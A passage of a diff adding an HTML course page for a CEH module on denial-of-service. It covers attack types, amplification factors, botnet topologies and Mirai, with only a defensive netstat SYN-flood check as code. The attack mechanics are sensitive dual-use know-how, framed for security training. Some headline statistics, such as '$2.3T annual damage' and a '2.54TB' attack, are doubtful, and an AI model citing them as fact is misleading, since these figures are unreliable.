@@ -1,0 +1,3076 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CEH v13 Module 10: Denial-of-Service</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --primary-color: #2c3e50;
+            --secondary-color: #3498db;
+            --accent-color: #e74c3c;
+            --success-color: #27ae60;
+            --warning-color: #f39c12;
+            --bg-light: #ecf0f1;
+            --text-color: #2c3e50;
+            --card-shadow: 0 8px 25px rgba(0, 0, 0, 0.1);
+            --gradient-primary: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            --gradient-danger: linear-gradient(135deg, #ff6b6b 0%, #ee5a24 100%);
+            --gradient-success: linear-gradient(135deg, #56ab2f 0%, #a8e6cf 100%);
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #74b9ff 0%, #0984e3 100%);
+            min-height: 100vh;
+            color: var(--text-color);
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        .header {
+            text-align: center;
+            color: white;
+            margin-bottom: 30px;
+            padding: 30px;
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 15px;
+            backdrop-filter: blur(10px);
+        }
+
+        .header h1 {
+            font-size: 2.5em;
+            margin-bottom: 10px;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
+        }
+
+        .header p {
+            font-size: 1.2em;
+            opacity: 0.9;
+            margin-bottom: 20px;
+        }
+
+        .progress-container {
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 25px;
+            padding: 8px;
+            margin: 20px auto;
+            max-width: 600px;
+        }
+
+        .progress-bar {
+            background: var(--gradient-success);
+            height: 20px;
+            border-radius: 20px;
+            transition: width 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: bold;
+            font-size: 0.9em;
+        }
+
+        .navigation {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 30px;
+        }
+
+        .nav-btn {
+            background: rgba(255, 255, 255, 0.9);
+            border: none;
+            padding: 12px 20px;
+            border-radius: 25px;
+            cursor: pointer;
+            font-weight: 600;
+            transition: all 0.3s ease;
+            color: var(--text-color);
+            min-width: 120px;
+        }
+
+        .nav-btn:hover, .nav-btn.active {
+            background: white;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+        }
+
+        .content-area {
+            background: white;
+            border-radius: 15px;
+            padding: 30px;
+            box-shadow: var(--card-shadow);
+            min-height: 600px;
+        }
+
+        .module-section {
+            display: none;
+        }
+
+        .module-section.active {
+            display: block;
+            animation: fadeIn 0.5s ease-in;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .section-title {
+            color: var(--primary-color);
+            border-bottom: 3px solid var(--secondary-color);
+            padding-bottom: 15px;
+            margin-bottom: 25px;
+            font-size: 2em;
+        }
+
+        .card {
+            background: #f8f9fa;
+            border-radius: 12px;
+            padding: 25px;
+            margin: 20px 0;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.08);
+            border-left: 5px solid var(--secondary-color);
+        }
+
+        .card h3 {
+            color: var(--primary-color);
+            margin-bottom: 15px;
+            font-size: 1.4em;
+        }
+
+        .card p {
+            line-height: 1.8;
+            margin-bottom: 15px;
+        }
+
+        .card ul, .card ol {
+            margin: 15px 0;
+            padding-left: 25px;
+        }
+
+        .card li {
+            margin: 8px 0;
+            line-height: 1.6;
+        }
+
+        .attack-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 20px;
+            margin: 25px 0;
+        }
+
+        .attack-card {
+            background: white;
+            border-radius: 12px;
+            padding: 20px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            border-top: 4px solid var(--accent-color);
+            transition: transform 0.3s ease;
+        }
+
+        .attack-card:hover {
+            transform: translateY(-5px);
+        }
+
+        .tool-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+            margin: 25px 0;
+        }
+
+        .tool-card {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 20px;
+            border-radius: 12px;
+            text-align: center;
+        }
+
+        .btn {
+            background: var(--gradient-primary);
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 25px;
+            cursor: pointer;
+            font-size: 1em;
+            font-weight: 600;
+            transition: all 0.3s ease;
+            display: inline-block;
+            text-decoration: none;
+            margin: 10px 5px;
+        }
+
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.2);
+        }
+
+        .btn-success {
+            background: var(--gradient-success);
+        }
+
+        .btn-warning {
+            background: linear-gradient(135deg, #f39c12 0%, #e67e22 100%);
+        }
+
+        .btn-danger {
+            background: var(--gradient-danger);
+        }
+
+        .quiz-container {
+            background: #f8f9fa;
+            padding: 25px;
+            border-radius: 12px;
+            margin: 20px 0;
+        }
+
+        .question {
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            margin: 15px 0;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+        }
+
+        .question h4 {
+            color: var(--primary-color);
+            margin-bottom: 15px;
+        }
+
+        .options label {
+            display: block;
+            padding: 10px;
+            margin: 5px 0;
+            background: #f8f9fa;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background 0.3s ease;
+        }
+
+        .options label:hover {
+            background: #e9ecef;
+        }
+
+        .options input {
+            margin-right: 10px;
+        }
+
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            z-index: 1000;
+            backdrop-filter: blur(5px);
+        }
+
+        .modal-content {
+            background: white;
+            margin: 5% auto;
+            padding: 30px;
+            border-radius: 15px;
+            max-width: 800px;
+            max-height: 80vh;
+            overflow-y: auto;
+            position: relative;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+        }
+
+        .close {
+            position: absolute;
+            right: 20px;
+            top: 15px;
+            font-size: 2em;
+            cursor: pointer;
+            color: #999;
+        }
+
+        .close:hover {
+            color: #333;
+        }
+
+        .highlight {
+            background: linear-gradient(135deg, #ff6b6b 0%, #ee5a24 100%);
+            color: white;
+            padding: 20px;
+            border-radius: 10px;
+            margin: 15px 0;
+        }
+
+        .info-box {
+            background: linear-gradient(135deg, #0984e3 0%, #74b9ff 100%);
+            color: white;
+            padding: 20px;
+            border-radius: 10px;
+            margin: 15px 0;
+        }
+
+        .warning-box {
+            background: linear-gradient(135deg, #f39c12 0%, #e67e22 100%);
+            color: white;
+            padding: 20px;
+            border-radius: 10px;
+            margin: 15px 0;
+        }
+
+        .success-box {
+            background: var(--gradient-success);
+            color: white;
+            padding: 20px;
+            border-radius: 10px;
+            margin: 15px 0;
+        }
+
+        .resources-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 20px;
+            margin: 25px 0;
+        }
+
+        .resource-card {
+            background: white;
+            padding: 20px;
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+        }
+
+        .resource-card h4 {
+            color: var(--primary-color);
+            margin-bottom: 15px;
+            padding-bottom: 10px;
+            border-bottom: 2px solid var(--secondary-color);
+        }
+
+        .resource-card a {
+            color: var(--secondary-color);
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .resource-card a:hover {
+            color: var(--accent-color);
+            text-decoration: underline;
+        }
+
+        .labs-container {
+            background: #f8f9fa;
+            padding: 25px;
+            border-radius: 12px;
+            margin: 20px 0;
+        }
+
+        .lab-card {
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            margin: 15px 0;
+            border-left: 5px solid var(--warning-color);
+        }
+
+        .lab-steps {
+            background: #f8f9fa;
+            padding: 15px;
+            border-radius: 8px;
+            margin: 10px 0;
+        }
+
+        .code-block {
+            background: #2c3e50;
+            color: #ecf0f1;
+            padding: 15px;
+            border-radius: 8px;
+            font-family: 'Courier New', monospace;
+            margin: 10px 0;
+            overflow-x: auto;
+        }
+
+        @media (max-width: 768px) {
+            .container {
+                padding: 10px;
+            }
+            
+            .header h1 {
+                font-size: 2em;
+            }
+            
+            .navigation {
+                flex-direction: column;
+                align-items: center;
+            }
+            
+            .nav-btn {
+                width: 90%;
+                max-width: 300px;
+            }
+            
+            .attack-grid, .tool-grid, .resources-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        .stats-container {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 15px;
+            margin: 20px 0;
+        }
+
+        .stat-card {
+            background: var(--gradient-primary);
+            color: white;
+            padding: 20px;
+            border-radius: 12px;
+            text-align: center;
+        }
+
+        .stat-number {
+            font-size: 2.5em;
+            font-weight: bold;
+            margin-bottom: 5px;
+        }
+
+        .timeline {
+            position: relative;
+            margin: 30px 0;
+        }
+
+        .timeline-item {
+            background: white;
+            padding: 20px;
+            margin: 20px 0;
+            border-radius: 10px;
+            border-left: 4px solid var(--secondary-color);
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+        }
+
+        .timeline-item h4 {
+            color: var(--primary-color);
+            margin-bottom: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Header -->
+        <div class="header">
+            <h1>💥 CEH v13 Module 10: Denial-of-Service</h1>
+            <p>Understanding, Executing, Detecting & Mitigating DoS/DDoS Attacks</p>
+            <div class="progress-container">
+                <div class="progress-bar" id="progressBar" style="width: 0%;">
+                    <span id="progressText">Progress: 0% Complete</span>
+                </div>
+            </div>
+            <div style="margin-top: 15px; font-size: 0.9em; color: rgba(255,255,255,0.8);">
+                <span style="background: rgba(255,255,255,0.1); padding: 8px 15px; border-radius: 20px; margin: 0 5px;">
+                    ← → Navigate Sections
+                </span>
+                <span style="background: rgba(255,255,255,0.1); padding: 8px 15px; border-radius: 20px; margin: 0 5px;">
+                    Esc Close Modal
+                </span>
+            </div>
+        </div>
+
+        <!-- Navigation -->
+        <div class="navigation">
+            <button class="nav-btn active" onclick="showSection('overview')">📋 Overview</button>
+            <button class="nav-btn" onclick="showSection('dos-concepts')">💥 DoS Concepts</button>
+            <button class="nav-btn" onclick="showSection('attack-types')">⚔️ Attack Types</button>
+            <button class="nav-btn" onclick="showSection('botnets')">🤖 Botnets & DDoS</button>
+            <button class="nav-btn" onclick="showSection('tools')">🔧 Attack Tools</button>
+            <button class="nav-btn" onclick="showSection('detection')">🔍 Detection</button>
+            <button class="nav-btn" onclick="showSection('countermeasures')">🛡️ Countermeasures</button>
+            <button class="nav-btn" onclick="showSection('case-studies')">📚 Case Studies</button>
+            <button class="nav-btn" onclick="showSection('quiz')">📝 Assessment</button>
+            <button class="nav-btn" onclick="showSection('resources')">📚 Resources</button>
+        </div>
+
+        <div class="content-area">
+            <!-- Overview Section -->
+            <div id="overview" class="module-section active">
+                <h2 class="section-title">💥 Denial-of-Service: The Digital Siege</h2>
+                
+                <div class="card">
+                    <h3>🎯 Welcome to CEH v13 Module 10!</h3>
+                    <p>Denial-of-Service (DoS) and Distributed Denial-of-Service (DDoS) attacks represent one of the most prevalent and disruptive forms of cyber attacks in today's digital landscape. Unlike other attacks that aim to steal data or gain unauthorized access, DoS attacks are designed to disrupt service availability, making systems and networks inaccessible to legitimate users.</p>
+                    
+                    <div class="highlight">
+                        <h4>🎯 Module Learning Objectives</h4>
+                        <ul>
+                            <li><strong>Understand DoS/DDoS fundamentals:</strong> Learn the concepts, motivations, and impact of denial-of-service attacks</li>
+                            <li><strong>Master attack techniques:</strong> Explore volumetric, protocol, and application-layer attack methods</li>
+                            <li><strong>Analyze botnet operations:</strong> Understand how distributed networks amplify attack power</li>
+                            <li><strong>Utilize attack tools:</strong> Gain hands-on experience with DoS/DDoS testing tools</li>
+                            <li><strong>Implement detection:</strong> Learn to identify and analyze attack patterns</li>
+                            <li><strong>Deploy countermeasures:</strong> Design and implement effective protection strategies</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div class="stats-container">
+                    <div class="stat-card">
+                        <div class="stat-number">$2.3T</div>
+                        <div>Annual DDoS Damage</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-number">13M</div>
+                        <div>DDoS Attacks in 2024</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-number">2.54TB</div>
+                        <div>Largest Recorded DDoS</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-number">87%</div>
+                        <div>Attacks Use Reflection</div>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>🚀 What Makes DoS Attacks Unique?</h3>
+                    <div class="info-box">
+                        <p><strong>Primary Goal:</strong> Unlike other cyber attacks that focus on data theft or system compromise, DoS attacks aim to disrupt service availability. The attacker's objective is to overwhelm the target's resources, making services unavailable to legitimate users.</p>
+                    </div>
+                    
+                    <p>DoS attacks exploit the fundamental principle that all systems have finite resources - bandwidth, processing power, memory, and connection capacity. By overwhelming these resources, attackers can effectively "shut down" services, websites, or entire networks.</p>
+                </div>
+
+                <div class="card">
+                    <h3>📊 Module Structure & Timeline</h3>
+                    <div class="timeline">
+                        <div class="timeline-item">
+                            <h4>🎯 Foundation (45 minutes)</h4>
+                            <p>DoS concepts, historical context, and attack motivations</p>
+                        </div>
+                        <div class="timeline-item">
+                            <h4>⚔️ Attack Techniques (60 minutes)</h4>
+                            <p>Volumetric, protocol, and application-layer attacks</p>
+                        </div>
+                        <div class="timeline-item">
+                            <h4>🤖 Botnets & Tools (45 minutes)</h4>
+                            <p>Distributed attacks and practical tool usage</p>
+                        </div>
+                        <div class="timeline-item">
+                            <h4>🔍 Detection & Defense (60 minutes)</h4>
+                            <p>Identification techniques and countermeasures</p>
+                        </div>
+                        <div class="timeline-item">
+                            <h4>📚 Case Studies & Assessment (30 minutes)</h4>
+                            <p>Real-world examples and knowledge evaluation</p>
+                        </div>
+                    </div>
+                </div>
+
+                <button class="btn btn-success" onclick="showSection('dos-concepts')">Begin Learning Journey →</button>
+            </div>
+
+            <!-- DoS Concepts Section -->
+            <div id="dos-concepts" class="module-section">
+                <h2 class="section-title">💥 Denial-of-Service Fundamentals</h2>
+                
+                <div class="card">
+                    <h3>🎯 What is a Denial-of-Service Attack?</h3>
+                    <p>A Denial-of-Service (DoS) attack is a malicious attempt to disrupt the normal traffic of a targeted server, service, or network by overwhelming the target or its surrounding infrastructure with a flood of Internet traffic.</p>
+                    
+                    <div class="info-box">
+                        <h4>📚 Formal Definition</h4>
+                        <p><strong>DoS Attack:</strong> An attack that attempts to make a machine or network resource unavailable to its intended users by temporarily or indefinitely disrupting services of a host connected to the Internet.</p>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>🔄 DoS vs DDoS: Understanding the Difference</h3>
+                    <div class="attack-grid">
+                        <div class="attack-card">
+                            <h4>💥 DoS (Denial-of-Service)</h4>
+                            <ul>
+                                <li><strong>Source:</strong> Single attacking machine</li>
+                                <li><strong>Resources:</strong> Limited to one system's capacity</li>
+                                <li><strong>Detection:</strong> Easier to identify and block</li>
+                                <li><strong>Mitigation:</strong> Block single IP address</li>
+                                <li><strong>Impact:</strong> Generally limited scale</li>
+                                <li><strong>Cost:</strong> Low resource requirement</li>
+                            </ul>
+                        </div>
+                        <div class="attack-card">
+                            <h4>🌐 DDoS (Distributed DoS)</h4>
+                            <ul>
+                                <li><strong>Source:</strong> Multiple compromised machines</li>
+                                <li><strong>Resources:</strong> Amplified through botnet</li>
+                                <li><strong>Detection:</strong> Complex due to distributed nature</li>
+                                <li><strong>Mitigation:</strong> Requires sophisticated filtering</li>
+                                <li><strong>Impact:</strong> Massive scale potential</li>
+                                <li><strong>Cost:</strong> Higher setup but greater effect</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>🎯 Attack Motivations & Classifications</h3>
+                    <div class="warning-box">
+                        <h4>🔥 Why Do Attackers Launch DoS Attacks?</h4>
+                        <ul>
+                            <li><strong>Financial Gain:</strong> Extortion, competitive advantage, ransomware</li>
+                            <li><strong>Political Activism:</strong> Hacktivism, protest, ideological reasons</li>
+                            <li><strong>Personal Vendetta:</strong> Revenge, disgruntlement, ego</li>
+                            <li><strong>Terrorism/Warfare:</strong> State-sponsored attacks, cyber warfare</li>
+                            <li><strong>Testing/Research:</strong> Security testing, academic research</li>
+                            <li><strong>Diversion Tactic:</strong> Distraction while conducting other attacks</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>📈 Historical Evolution of DoS Attacks</h3>
+                    <div class="timeline">
+                        <div class="timeline-item">
+                            <h4>1996-2000: Early DoS Era</h4>
+                            <p>Simple flood attacks, Ping of Death, Smurf attacks targeting individual systems</p>
+                        </div>
+                        <div class="timeline-item">
+                            <h4>2000-2005: DDoS Emergence</h4>
+                            <p>First major DDoS attacks (Yahoo, Amazon, CNN), botnet development begins</p>
+                        </div>
+                        <div class="timeline-item">
+                            <h4>2005-2010: Botnet Revolution</h4>
+                            <p>Large-scale botnets (Conficker, Zeus), increased attack sophistication</p>
+                        </div>
+                        <div class="timeline-item">
+                            <h4>2010-2015: Amplification Era</h4>
+                            <p>DNS/NTP reflection attacks, Anonymous operations, nation-state involvement</p>
+                        </div>
+                        <div class="timeline-item">
+                            <h4>2015-Present: IoT & AI Era</h4>
+                            <p>Mirai botnet, IoT device exploitation, AI-enhanced attacks, record-breaking volumes</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>🎭 Attack Impact Categories</h3>
+                    <div class="attack-grid">
+                        <div class="attack-card">
+                            <h4>💰 Financial Impact</h4>
+                            <ul>
+                                <li>Revenue loss during downtime</li>
+                                <li>Customer compensation costs</li>
+                                <li>Emergency response expenses</li>
+                                <li>Reputation damage costs</li>
+                            </ul>
+                        </div>
+                        <div class="attack-card">
+                            <h4>⚙️ Operational Impact</h4>
+                            <ul>
+                                <li>Service disruption</li>
+                                <li>Employee productivity loss</li>
+                                <li>Infrastructure overload</li>
+                                <li>Recovery time requirements</li>
+                            </ul>
+                        </div>
+                        <div class="attack-card">
+                            <h4>🏢 Strategic Impact</h4>
+                            <ul>
+                                <li>Brand reputation damage</li>
+                                <li>Customer trust erosion</li>
+                                <li>Competitive disadvantage</li>
+                                <li>Regulatory compliance issues</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+
+                <button class="btn btn-success" onclick="showSection('attack-types')">Next: Attack Types →</button>
+            </div>
+
+            <!-- Attack Types Section -->
+            <div id="attack-types" class="module-section">
+                <h2 class="section-title">⚔️ DoS/DDoS Attack Classifications</h2>
+                
+                <div class="card">
+                    <h3>📊 The Three-Layer Attack Model</h3>
+                    <p>Modern DoS/DDoS attacks are classified into three primary categories based on the layer of the network stack they target:</p>
+                    
+                    <div class="attack-grid">
+                        <div class="attack-card" style="border-top-color: #e74c3c;">
+                            <h4>🌊 Volumetric Attacks (Layer 3/4)</h4>
+                            <p><strong>Goal:</strong> Consume bandwidth and network resources</p>
+                            <ul>
+                                <li>UDP Flood</li>
+                                <li>ICMP Flood</li>
+                                <li>Amplification/Reflection attacks</li>
+                                <li>Spoofed-packet floods</li>
+                            </ul>
+                            <div style="background: #e74c3c; color: white; padding: 10px; border-radius: 5px; margin-top: 10px;">
+                                <strong>Measurement:</strong> Bits per second (bps)
+                            </div>
+                        </div>
+                        <div class="attack-card" style="border-top-color: #f39c12;">
+                            <h4>🔧 Protocol Attacks (Layer 3/4)</h4>
+                            <p><strong>Goal:</strong> Exploit protocol weaknesses and state tables</p>
+                            <ul>
+                                <li>SYN Flood</li>
+                                <li>TCP Connection Flood</li>
+                                <li>Fragmented Packet Attack</li>
+                                <li>Ping of Death</li>
+                            </ul>
+                            <div style="background: #f39c12; color: white; padding: 10px; border-radius: 5px; margin-top: 10px;">
+                                <strong>Measurement:</strong> Packets per second (pps)
+                            </div>
+                        </div>
+                        <div class="attack-card" style="border-top-color: #9b59b6;">
+                            <h4>💻 Application Layer Attacks (Layer 7)</h4>
+                            <p><strong>Goal:</strong> Exhaust application resources and services</p>
+                            <ul>
+                                <li>HTTP Flood</li>
+                                <li>Slowloris</li>
+                                <li>DNS Query Flood</li>
+                                <li>SSL/TLS Exhaustion</li>
+                            </ul>
+                            <div style="background: #9b59b6; color: white; padding: 10px; border-radius: 5px; margin-top: 10px;">
+                                <strong>Measurement:</strong> Requests per second (rps)
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>🌊 Volumetric Attacks: The Bandwidth War</h3>
+                    <p>Volumetric attacks focus on consuming the bandwidth of the target network or service by generating massive amounts of traffic.</p>
+                    
+                    <div class="labs-container">
+                        <div class="lab-card">
+                            <h4>🎯 UDP Flood Attack</h4>
+                            <p>Sends large numbers of UDP packets to random or specific ports on the target system.</p>
+                            <div class="lab-steps">
+                                <strong>Attack Mechanism:</strong>
+                                <ol>
+                                    <li>Attacker sends UDP packets to random ports</li>
+                                    <li>Target tries to find applications listening on those ports</li>
+                                    <li>Target responds with ICMP "Destination Unreachable"</li>
+                                    <li>Target's resources are exhausted processing requests</li>
+                                </ol>
+                            </div>
+                        </div>
+                        
+                        <div class="lab-card">
+                            <h4>🎯 ICMP Flood (Ping Flood)</h4>
+                            <p>Overwhelming the target with ICMP Echo Request packets.</p>
+                            <div class="lab-steps">
+                                <strong>Attack Variants:</strong>
+                                <ul>
+                                    <li><strong>Ping Flood:</strong> Rapid ICMP Echo Requests</li>
+                                    <li><strong>Smurf Attack:</strong> Amplified ping using broadcast addresses</li>
+                                    <li><strong>Ping of Death:</strong> Oversized ICMP packets</li>
+                                </ul>
+                            </div>
+                        </div>
+                        
+                        <div class="lab-card">
+                            <h4>🎯 Amplification/Reflection Attacks</h4>
+                            <p>Uses third-party servers to amplify attack traffic volume.</p>
+                            <div class="lab-steps">
+                                <strong>Common Amplification Protocols:</strong>
+                                <ul>
+                                    <li><strong>DNS Amplification:</strong> Up to 179x amplification</li>
+                                    <li><strong>NTP Amplification:</strong> Up to 556x amplification</li>
+                                    <li><strong>SNMP Amplification:</strong> Up to 650x amplification</li>
+                                    <li><strong>Memcached Amplification:</strong> Up to 51,200x amplification</li>
+                                </ul>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>🔧 Protocol Attacks: Exploiting Network Weaknesses</h3>
+                    <p>Protocol attacks exploit weaknesses in network protocols, particularly targeting state tables and connection management.</p>
+                    
+                    <div class="labs-container">
+                        <div class="lab-card">
+                            <h4>🎯 SYN Flood Attack</h4>
+                            <p>Exploits the TCP three-way handshake by sending SYN requests without completing connections.</p>
+                            <div class="lab-steps">
+                                <strong>Attack Process:</strong>
+                                <ol>
+                                    <li>Attacker sends SYN packets with spoofed source IP</li>
+                                    <li>Server responds with SYN-ACK to spoofed address</li>
+                                    <li>Server waits for ACK that never arrives</li>
+                                    <li>Server's connection table fills up with half-open connections</li>
+                                    <li>Legitimate connection requests are rejected</li>
+                                </ol>
+                            </div>
+                            <div class="code-block">
+# Example SYN flood detection
+netstat -n | grep SYN_RECV | wc -l
+# High number indicates potential SYN flood
+                            </div>
+                        </div>
+                        
+                        <div class="lab-card">
+                            <h4>🎯 TCP Connection Flood</h4>
+                            <p>Establishes many legitimate TCP connections to exhaust server resources.</p>
+                            <div class="lab-steps">
+                                <strong>Attack Characteristics:</strong>
+                                <ul>
+                                    <li>Completes full TCP handshake</li>
+                                    <li>Maintains connections without sending data</li>
+                                    <li>Exhausts server connection limits</li>
+                                    <li>Harder to detect than SYN flood</li>
+                                </ul>
+                            </div>
+                        </div>
+                        
+                        <div class="lab-card">
+                            <h4>🎯 Fragmentation Attacks</h4>
+                            <p>Exploits IP fragmentation to overwhelm reassembly processes.</p>
+                            <div class="lab-steps">
+                                <strong>Attack Types:</strong>
+                                <ul>
+                                    <li><strong>Teardrop:</strong> Overlapping fragments</li>
+                                    <li><strong>Fragment Flood:</strong> Many incomplete fragments</li>
+                                    <li><strong>Rose Attack:</strong> Out-of-order fragments</li>
+                                </ul>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>💻 Application Layer Attacks: The Stealth Approach</h3>
+                    <p>Application layer attacks target specific applications and services, often using minimal bandwidth but maximum impact.</p>
+                    
+                    <div class="labs-container">
+                        <div class="lab-card">
+                            <h4>🎯 HTTP Flood Attack</h4>
+                            <p>Floods web servers with legitimate-looking HTTP requests.</p>
+                            <div class="lab-steps">
+                                <strong>Attack Variants:</strong>
+                                <ul>
+                                    <li><strong>GET Flood:</strong> Requests for static resources</li>
+                                    <li><strong>POST Flood:</strong> Form submission attacks</li>
+                                    <li><strong>Recursive GET:</strong> Requests that consume server resources</li>
+                                    <li><strong>Random Subdomain:</strong> Forces DNS lookups</li>
+                                </ul>
+                            </div>
+                        </div>
+                        
+                        <div class="lab-card">
+                            <h4>🎯 Slowloris Attack</h4>
+                            <p>Maintains many partial HTTP connections to exhaust server connection pool.</p>
+                            <div class="lab-steps">
+                                <strong>Attack Mechanism:</strong>
+                                <ol>
+                                    <li>Opens many HTTP connections</li>
+                                    <li>Sends partial HTTP requests</li>
+                                    <li>Periodically sends additional headers</li>
+                                    <li>Never completes requests</li>
+                                    <li>Server keeps connections open waiting for completion</li>
+                                </ol>
+                            </div>
+                        </div>
+                        
+                        <div class="lab-card">
+                            <h4>🎯 SSL/TLS Exhaustion</h4>
+                            <p>Exploits the computational cost of SSL/TLS handshakes.</p>
+                            <div class="lab-steps">
+                                <strong>Attack Impact:</strong>
+                                <ul>
+                                    <li>CPU-intensive cryptographic operations</li>
+                                    <li>Memory consumption for session state</li>
+                                    <li>Certificate chain validation overhead</li>
+                                </ul>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <button class="btn btn-success" onclick="showSection('botnets')">Next: Botnets & DDoS →</button>
+            </div>
+
+            <!-- Botnets Section -->
+            <div id="botnets" class="module-section">
+                <h2 class="section-title">🤖 Botnets: The DDoS Force Multiplier</h2>
+                
+                <div class="card">
+                    <h3>🌐 Understanding Botnet Architecture</h3>
+                    <p>A botnet is a network of compromised computers (called "bots" or "zombies") controlled remotely by a cybercriminal. These networks are the primary enabler of large-scale DDoS attacks.</p>
+                    
+                    <div class="info-box">
+                        <h4>🔍 Botnet Components</h4>
+                        <ul>
+                            <li><strong>Bot Herder/Botmaster:</strong> The criminal controlling the botnet</li>
+                            <li><strong>Command & Control (C&C) Server:</strong> Central communication hub</li>
+                            <li><strong>Bots/Zombies:</strong> Infected computers in the network</li>
+                            <li><strong>Bot Software:</strong> Malware installed on compromised systems</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>🏗️ Botnet Topologies</h3>
+                    <div class="attack-grid">
+                        <div class="attack-card">
+                            <h4>⭐ Centralized (Star) Topology</h4>
+                            <ul>
+                                <li><strong>Structure:</strong> Central C&C server</li>
+                                <li><strong>Communication:</strong> Direct bot-to-server</li>
+                                <li><strong>Advantages:</strong> Simple, fast commands</li>
+                                <li><strong>Disadvantages:</strong> Single point of failure</li>
+                                <li><strong>Examples:</strong> Conficker.A, Zeus</li>
+                            </ul>
+                        </div>
+                        <div class="attack-card">
+                            <h4>🕸️ Decentralized (P2P) Topology</h4>
+                            <ul>
+                                <li><strong>Structure:</strong> Peer-to-peer network</li>
+                                <li><strong>Communication:</strong> Bot-to-bot relay</li>
+                                <li><strong>Advantages:</strong> No single point of failure</li>
+                                <li><strong>Disadvantages:</strong> Complex, slower commands</li>
+                                <li><strong>Examples:</strong> Conficker.C, Kelihos</li>
+                            </ul>
+                        </div>
+                        <div class="attack-card">
+                            <h4>☁️ Hybrid Topology</h4>
+                            <ul>
+                                <li><strong>Structure:</strong> Multiple C&C servers</li>
+                                <li><strong>Communication:</strong> Mixed approach</li>
+                                <li><strong>Advantages:</strong> Redundancy and speed</li>
+                                <li><strong>Disadvantages:</strong> More complex to manage</li>
+                                <li><strong>Examples:</strong> Modern botnets</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>📱 IoT Botnets: The New Threat Landscape</h3>
+                    <p>Internet of Things (IoT) devices have become the new frontier for botnet recruitment due to their poor security implementations and massive deployment scale.</p>
+                    
+                    <div class="warning-box">
+                        <h4>🚨 Mirai Botnet Case Study</h4>
+                        <p><strong>Discovery:</strong> September 2016 | <strong>Peak Size:</strong> 400,000+ devices | <strong>Notable Attacks:</strong> Dyn DNS (2016)</p>
+                        <ul>
+                            <li><strong>Target Devices:</strong> IP cameras, routers, DVRs, smart TVs</li>
+                            <li><strong>Infection Method:</strong> Default/weak credentials scanning</li>
+                            <li><strong>Attack Scale:</strong> 1.2 Tbps peak traffic</li>
+                            <li><strong>Impact:</strong> Major websites unavailable (Twitter, Netflix, PayPal)</li>
+                            <li><strong>Evolution:</strong> Source code release led to numerous variants</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>🔄 Botnet Lifecycle</h3>
+                    <div class="timeline">
+                        <div class="timeline-item">
+                            <h4>1. 🎯 Initial Compromise</h4>
+                            <p>Malware distribution through phishing, drive-by downloads, exploits, or credential stuffing</p>
+                        </div>
+                        <div class="timeline-item">
+                            <h4>2. 📡 Registration & Communication</h4>
+                            <p>Infected system contacts C&C server, registers bot ID, awaits commands</p>
+                        </div>
